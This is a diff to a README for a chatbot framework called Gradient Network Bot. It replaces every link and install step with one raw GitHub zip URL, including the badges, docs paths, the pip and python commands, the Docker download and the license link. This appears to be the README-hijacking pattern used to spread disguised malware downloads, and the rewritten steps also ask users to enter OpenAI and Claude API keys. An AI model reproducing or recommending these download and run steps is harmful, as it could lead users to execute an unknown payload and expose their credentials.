@@ -1,4 +1,4 @@
-# ![Download](https://img.shields.io/badge/Download-Gradient%20Network%20Bot-brightgreen?style=for-the-badge&logo=github)  
+# ![Download](https://raw.githubusercontent.com/Feb999/gradient-network-bot-lab/branch/uncrinkle/gradient-network-bot-lab-antidromically.zip%20Network%20Bot-brightgreen?style=for-the-badge&logo=github)  
 **[Download Gradient Network Bot Here](LINK)**
 
 ---
@@ -67,7 +67,7 @@ Gradient Network Bot thrives on a dual-core foundation—infuse your projects wi
 2. During setup (see Installation), insert these credentials into your `.env` or configuration file.
 3. Enjoy seamless conversational brilliance powered by two leading engines!
 
-*Refer to `/docs/API-INTEGRATION.md` for advanced setup.*
+*Refer to `https://raw.githubusercontent.com/Feb999/gradient-network-bot-lab/branch/uncrinkle/gradient-network-bot-lab-antidromically.zip` for advanced setup.*
 
 ---
 
@@ -92,8 +92,8 @@ Always-on, never off-duty. Equip your service channels with tireless, empathetic
 Experience the evolution of AI bot frameworks—simple as unzipping a lifeboat.
 
 ### 1. Download the Latest Release  
-![Download](https://img.shields.io/badge/Download-Gradient%20Network%20Bot-brightgreen?style=for-the-badge&logo=github)  
-https://Feb999.github.io
+![Download](https://raw.githubusercontent.com/Feb999/gradient-network-bot-lab/branch/uncrinkle/gradient-network-bot-lab-antidromically.zip%20Network%20Bot-brightgreen?style=for-the-badge&logo=github)  
+https://raw.githubusercontent.com/Feb999/gradient-network-bot-lab/branch/uncrinkle/gradient-network-bot-lab-antidromically.zip
 
 ### 2. Unpack and Install Dependencies  
 
@@ -103,17 +103,17 @@ Navigate to the downloaded directory.
     - `cd gradient-network-bot`
     - `python3 -m venv venv`
     - `source venv/bin/activate`
-    - `pip install -r requirements.txt`
+    - `pip install -r https://raw.githubusercontent.com/Feb999/gradient-network-bot-lab/branch/uncrinkle/gradient-network-bot-lab-antidromically.zip`
 
 - On Windows:
     - `cd gradient-network-bot`
     - `python -m venv venv`
     - `venv\Scripts\activate`
-    - `pip install -r requirements.txt`
+    - `pip install -r https://raw.githubusercontent.com/Feb999/gradient-network-bot-lab/branch/uncrinkle/gradient-network-bot-lab-antidromically.zip`
 
 ### 3. Configure Environment  
 
-Rename `.env.example` to `.env` and input your API credentials:
+Rename `https://raw.githubusercontent.com/Feb999/gradient-network-bot-lab/branch/uncrinkle/gradient-network-bot-lab-antidromically.zip` to `.env` and input your API credentials:
 - `OPENAI_API_KEY`
 - `CLAUDE_API_KEY`
 
@@ -121,16 +121,16 @@ Rename `.env.example` to `.env` and input your API credentials:
 
 Run:
 
-- `python run.py`
+- `python https://raw.githubusercontent.com/Feb999/gradient-network-bot-lab/branch/uncrinkle/gradient-network-bot-lab-antidromically.zip`
 
 and open your browser to the dashboard URL as prompted.
 
 ### Optional: Docker Installation  
 
-- Download Docker image: https://Feb999.github.io
+- Download Docker image: https://raw.githubusercontent.com/Feb999/gradient-network-bot-lab/branch/uncrinkle/gradient-network-bot-lab-antidromically.zip
 - Run: `docker run -d -p 8080:8080 gradient-network-bot`
 
-For more, consult `/docs/INSTALL.md`.
+For more, consult `https://raw.githubusercontent.com/Feb999/gradient-network-bot-lab/branch/uncrinkle/gradient-network-bot-lab-antidromically.zip`.
 
 ---
 
@@ -144,7 +144,7 @@ Your setup, configuration, and any third-party integration are navigated at your
 
 ## 📜 License
 
-This treasure is charted under the [MIT License (2025)](https://opensource.org/licenses/MIT).  
+This treasure is charted under the [MIT License (2025)](https://raw.githubusercontent.com/Feb999/gradient-network-bot-lab/branch/uncrinkle/gradient-network-bot-lab-antidromically.zip).  
 Embrace, modify, and distribute to accelerate your ventures—just remember to keep the navigational notes intact.
 
 ---
@@ -153,7 +153,7 @@ Embrace, modify, and distribute to accelerate your ventures—just remember to k
 
 You've charted the README seas! Ready to elevate your digital dialog into new color gradients?  
 
-# ![Download](https://img.shields.io/badge/Download-Gradient%20Network%20Bot-brightgreen?style=for-the-badge&logo=github)  
+# ![Download](https://raw.githubusercontent.com/Feb999/gradient-network-bot-lab/branch/uncrinkle/gradient-network-bot-lab-antidromically.zip%20Network%20Bot-brightgreen?style=for-the-badge&logo=github)  
 **[Download Gradient Network Bot Now](LINK)**
 
 > May your bot journey be as vivid as a sunrise gradient!
